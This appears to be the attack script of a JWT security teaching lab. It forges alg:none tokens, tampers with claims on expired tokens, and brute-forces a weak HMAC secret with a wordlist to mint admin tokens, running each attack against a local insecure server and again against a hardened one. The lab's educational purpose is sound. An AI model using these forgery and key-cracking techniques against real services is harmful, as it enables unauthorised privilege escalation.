/**
 * Runs each JWT attack against /insecure, then the same attack against /secure
 * to show it blocked. Start the server first (npm run dev), then: npm run attack
 *
 * No library is used to FORGE tokens on purpose — we build them by hand with
 * base64url so you can see exactly what an attacker changes.
 */
import { createHmac } from "node:crypto";

const API = process.env.API_URL ?? `http://localhost:${process.env.PORT ?? 8090}`;
const col = (n: number, s: string) => (process.stdout.isTTY ? `\x1b[${n}m${s}\x1b[0m` : s);
const red = (s: string) => col(31, s);
const grn = (s: string) => col(32, s);
const dim = (s: string) => col(90, s);
const b64 = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");

async function login(world: string, username: string, password: string): Promise<string> {
  const r = await fetch(`${API}/${world}/login`, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  return ((await r.json()) as { token: string }).token;
}
async function hit(world: string, path: string, token: string) {
  const r = await fetch(`${API}/${world}${path}`, { headers: { authorization: `Bearer ${token}` } });
  return { status: r.status, body: (await r.json()) as any };
}
function header(n: number, t: string) { console.log(`\n${col(1, `━━━ ${n}. ${t} ━━━`)}`); }
function show(label: string, r: { status: number; body: any }) {
  const got = r.body.secret ? `admin access! ${r.body.secret}` : r.body.error ?? JSON.stringify(r.body.claims);
  const pwned = r.status === 200 && r.body.ok;
  console.log(`  ${label}: ${pwned ? red(`PWNED — ${got}`) : grn(`blocked (${r.status}) — ${got}`)}`);
}

/* 1 ───────────────────── alg:none forgery ─────────────────────────────── */
async function algNone() {
  header(1, "alg:none forgery  (no signature at all)");
  // Forge an admin token with the algorithm set to "none" and an empty signature.
  const forged = `${b64({ alg: "none", typ: "JWT" })}.${b64({ sub: "99", username: "mallory", role: "admin" })}.`;
  console.log(dim(`  forged token: ${forged}`));
  show("/insecure/admin", await hit("insecure", "/admin", forged));
  show("/secure/admin  ", await hit("secure", "/admin", forged));
}

/* 2 ──────────────── claim tampering + expiry replay ───────────────────── */
async function claimTamper() {
  header(2, "Claim tampering + expiry  (user → admin, ignore exp)");
  // A real captured token from a normal user, decoded, role flipped to admin,
  // and an already-expired exp added — then re-signed with the WEAK secret
  // (which we will also crack in attack 3; here we just assume it is known).
  const headerPart = b64({ alg: "HS256", typ: "JWT" });
  const payload = b64({ sub: "1", username: "alice", role: "admin", exp: 1 }); // exp=1970, long expired
  const sig = createHmac("sha256", "secret").update(`${headerPart}.${payload}`).digest("base64url");
  const forged = `${headerPart}.${payload}.${sig}`;
  console.log(dim("  alice's token, role changed to admin, exp set to 1970"));
  show("/insecure/admin", await hit("insecure", "/admin", forged));
  show("/secure/admin  ", await hit("secure", "/admin", forged));
}

/* 3 ─────────────────── weak-secret brute-force ────────────────────────── */
async function bruteForce() {
  header(3, "Weak-secret brute-force  (crack the HMAC key offline)");
  // Capture any legitimately-signed token from the insecure server.
  const captured = await login("insecure", "alice", "alice-pass-123");
  const [h, p, sig] = captured.split(".");
  console.log(dim(`  captured token signed by the server; cracking its secret...`));

  // Try a small wordlist offline — no requests to the server needed.
  const wordlist = ["123456", "password", "admin", "letmein", "changeme", "secret", "jwt", "token"];
  let cracked: string | null = null;
  for (const guess of wordlist) {
    if (createHmac("sha256", guess).update(`${h}.${p}`).digest("base64url") === sig) { cracked = guess; break; }
  }
  if (!cracked) { console.log(grn("  secret not in wordlist")); return; }
  console.log(red(`  CRACKED: the signing secret is "${cracked}"`));

  // With the secret, forge a fully-valid admin token.
  const forged = (() => {
    const hp = `${b64({ alg: "HS256", typ: "JWT" })}.${b64({ sub: "99", username: "mallory", role: "admin" })}`;
    return `${hp}.${createHmac("sha256", cracked!).update(hp).digest("base64url")}`;
  })();
  show("/insecure/admin", await hit("insecure", "/admin", forged));

  // The same wordlist attack on a token from the SECURE server (256-bit random key).
  const secureToken = await login("secure", "alice", "alice-pass-123");
  const [sh, sp, ssig] = secureToken.split(".");
  const found = wordlist.some((g) => createHmac("sha256", g).update(`${sh}.${sp}`).digest("base64url") === ssig);
  console.log(found ? red("  secure secret cracked (!)") : grn("  /secure: 256-bit random secret NOT in any wordlist — uncrackable this way"));
}

async function main() {
  console.log(col(1, "JWT ATTACK LAB — attacks vs /insecure, same attacks vs /secure"));
  // sanity: a normal user is NOT admin on either side
  const t = await login("insecure", "alice", "alice-pass-123");
  console.log(dim(`\nbaseline: alice (a normal user) hitting /insecure/admin:`));
  show("  /insecure/admin", await hit("insecure", "/admin", t));

  await algNone();
  await claimTamper();
  await bruteForce();
  console.log(`\n${grn("Done.")} ${dim("Red = attack succeeded on /insecure. Green = blocked on /secure.")}\n`);
}
main().catch((e) => { console.error(e); process.exit(1); });
